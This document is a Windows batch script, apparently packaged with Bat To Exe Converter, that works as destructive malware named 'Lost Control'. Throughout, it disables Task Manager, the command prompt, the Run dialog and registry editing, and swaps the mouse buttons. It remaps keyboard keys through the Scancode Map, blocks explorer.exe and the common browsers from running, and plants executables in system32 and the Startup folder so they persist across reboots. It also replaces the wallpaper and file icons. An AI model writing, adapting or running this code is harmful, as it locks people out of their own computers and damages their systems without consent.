::[Bat To Exe Converter]
::
::fBE1pAF6MU+EWH3eyHEzOhJEWDiMGmKoA4kduePy4+bJp1UYNA==
::fBE1pAF6MU+EWH3eyHEzOhJEWDiMGmKoA4kduuTy/P7Jp1UYNA==
::fBE1pAF6MU+EWH3eyHEzOhJEWDiMGmKoA4kdvODy4f7Jp1UYNA==
::fBE1pAF6MU+EWH3eyHEzOhJEWDiMGmKoA4kdvfzy4u/Jp1UYNA==
::fBE1pAF6MU+EWH3eyHEzOhJEWDiMGmKoA4kd5Of37qSCukh9
::fBE1pAF6MU+EWH3eyHEzOhJEWDiMGmKoA4kY5+bvoeCXpS0=
::YAwzoRdxOk+EWAjk
::fBw5plQjdCuDJGqH5ksgPCdaag2QOVezBboSpuH44Io=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSTk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCuDJGqH5ksgPCdaag2QOVefCLEQ4eb+oe+fpy0=
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
taskkill /f /im taskmgr.exe
if exist "%localappdata%\Lost Control" rd "%localappdata%\Lost Control"/q/s
md "%localappdata%\Lost Control"
attrib +h "%localappdata%\Lost Control"
reg add HKCU\software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun /t REG_DWORD /d 1 /f
reg add HKCU\software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
reg add HKCU\software\Policies\Microsoft\Windows\System /v DisableCMD /t REG_DWORD /d 2 /f
reg add "HKCU\Control Panel\Mouse" /v SwapMouseButtons /t REG_SZ /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Keyboard Layout" /v "Scancode Map" /t REG_BINARY /d 00000000000000000200000000001E0003000000000030000400000000002E000500000000002F000600000000001800070000000000140008000000000020000900000000002D00AA0000002E003200BB00000000000E00CC005BE000005CE0DD00000000003900EE00000000001C00FF000000000001001000000000001D0011000000190022001200000022001900 /f
reg add "HKCU\Control Panel\Keyboard" /v KeyboardDelay /t REG_SZ /d 2000 /f
reg add "HKCU\Control Panel\Keyboard" /v KeyboardSpeed /t REG_SZ /d 1 /f
reg add HKCU\software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v DisallowRun /t REG_DWORD /d 6 /f
reg add HKCU\software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun /v 1 /t REG_SZ /d chrome.exe /f
reg add HKCU\software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun /v 2 /t REG_SZ /d notepad.exe /f
reg add HKCU\software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun /v 3 /t REG_SZ /d iexplore.exe /f
reg add HKCU\software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun /v 4 /t REG_SZ /d explorer.exe /f
reg add HKCU\software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun /v 5 /t REG_SZ /d mspaint.exe /f
reg add HKCU\software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun /v 6 /t REG_SZ /d firefox.exe /f





copy alola.exe "%windir%\system32\commandkiller.exe"/y
if exist "%windir%\system32\commandkiller.exe" del alola.exe/q

copy a0ico.ico "%localappdata%\Lost Control\taken.ico"/y
if exist "%localappdata%\Lost Control\taken.ico" del a0ico.ico/q

reg add HKCR\txtfile\DefaultIcon /t REG_EXPAND_SZ /d "%localappdata%\Lost Control\taken.ico" /f 

if exist "%windir%\system32\WindowsStarter" rd "%windir%\system32\WindowsStarter"/q/s
md "%windir%\system32\WindowsStarter"

copy a1kill.exe "%windir%\system32\WindowsStarter\taskkill.exe"/y
if exist %windir%\system32\WindowsStarter\taskkill.exe del a1kill.exe/q

copy a2list.exe "%windir%\system32\WindowsStarter\tasklist.exe"/y
if exist %windir%\system32\WindowsStarter\tasklist.exe del a2list.exe

copy dont.jpg "%localappdata%\Lost Control\dont.jpg"/y
if exist "%localappdata%\Lost Control\dont.jpg" del dont.jpg/q


copy a4hint.exe "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\SuperHint.exe"/y
if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\SuperHint.exe" del a4hint.exe/q

copy a5time.exe "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Timeout.exe"/y
if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Timeout.exe" del a5time.exe/q



reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%localappdata%\Lost Control\dont.jpg" /f
reg add "HKCU\Control Panel\Desktop" /v WallpaperStyle /t REG_SZ /d 10 /f
timeout 1 >nul /nobreak
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters

cd "%windir%\system32"
start commandkiller.exe
reg add "HKCU\Control Panel\Mouse" /v DoubleClickSpeed /t REG_SZ /d 1 /f
reg add HKCU\software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f
del Endline.exe/q